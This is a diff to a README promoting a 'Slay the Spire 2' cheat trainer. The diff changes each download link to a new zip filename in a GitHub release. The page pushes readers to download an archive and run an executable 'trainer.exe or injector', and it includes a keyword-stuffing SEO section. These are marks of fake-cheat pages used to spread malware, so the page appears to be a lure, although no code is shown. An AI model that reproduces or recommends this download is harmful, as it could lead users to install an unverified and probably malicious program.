@@ -5,7 +5,7 @@
 **Powerful Overlay Cheat Menu / Trainer for Slay the Spire 2 Early Access (v1.0 – March 2026)**  
 Infinite Energy, God Mode (Infinite HP), Infinite Gold, Zero Cost Cards, Unlock All Cards & Relics, One Hit Kill, Deck Editor + more!
 
-[![Download Slay the Spire 2 Trainer 2026 – Latest Release](https://img.shields.io/badge/DOWNLOAD%20LATEST%20RELEASE-FF3366?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/Icesaintgutter/slay-the-spire-2/releases/download/Release/slaythespire.zip)
+[![Download Slay the Spire 2 Trainer 2026 – Latest Release](https://img.shields.io/badge/DOWNLOAD%20LATEST%20RELEASE-FF3366?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/Icesaintgutter/slay-the-spire-2/releases/download/Release/slay.the.spire.zip)
 
 <img width="508" height="781" alt="image" src="https://github.com/user-attachments/assets/f07005a1-7e59-4807-b7d3-4beec84a8691" />
 
@@ -42,7 +42,7 @@ Perfect for testing builds, farming relics, or just having fun in **Slay the Spi
 
 ## 🚀 How to Install & Use Slay the Spire 2 Trainer (2026)
 
-1. Download the latest release → [Click the big pink button above](https://github.com/Icesaintgutter/slay-the-spire-2/releases/download/Release/slaythespire.zip)  
+1. Download the latest release → [Click the big pink button above](https://github.com/Icesaintgutter/slay-the-spire-2/releases/download/Release/slay.the.spire.zip)  
 2. Extract the .zip / .rar file  
 3. Launch **Slay the Spire 2** (Early Access – released March 5, 2026)  
 4. Run the trainer executable (trainer.exe or injector)  
@@ -61,7 +61,7 @@ Perfect for testing builds, farming relics, or just having fun in **Slay the Spi
 
 ## 📥 Download Slay the Spire 2 Trainer 2026
 
-→ **[Latest Version – Click Here](https://github.com/Icesaintgutter/slay-the-spire-2/releases/download/Release/slaythespire.zip)** ←  
+→ **[Latest Version – Click Here](https://github.com/Icesaintgutter/slay-the-spire-2/releases/download/Release/slay.the.spire.zip)** ←  
 Always get the newest build from Releases tab!
 
 ## 🔍 SEO & Search Keywords (people actually search this in 2026)
